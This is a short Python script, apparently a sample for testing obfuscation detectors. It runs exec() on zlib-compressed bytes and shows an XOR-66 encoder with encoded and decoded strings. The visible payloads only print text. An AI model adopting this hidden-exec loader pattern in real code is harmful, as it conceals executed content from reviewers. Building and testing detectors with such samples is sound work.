import base64
import zlib
payload1 = b'print("Hello from base64!")'
compressed = b'x\x9c\x0b\xc9\xc8\xcd\xc9\xc9I,\t\n-.)--N.\xca,*\xc9/J)*\xd2\x02\x00}\x0e\x0f\xf5'
data = zlib.decompress(b'x\x9c\x0b\xc9\xc8\xcd\xc9\xc9I,\t\n-.)--N.\xca,*\xc9/J)*\xd2\x02\x00}\x0e\x0f\xf5')
exec(data)
obf = lambda x: ''.join((chr(ord(c) ^ 66) for c in x))
encoded = 'Qf`j`b`c`d'
dec = '\x13$"(" "!"&'
'# exec payload: \x13$"(" "!"&'
print('=== Original script finished ===')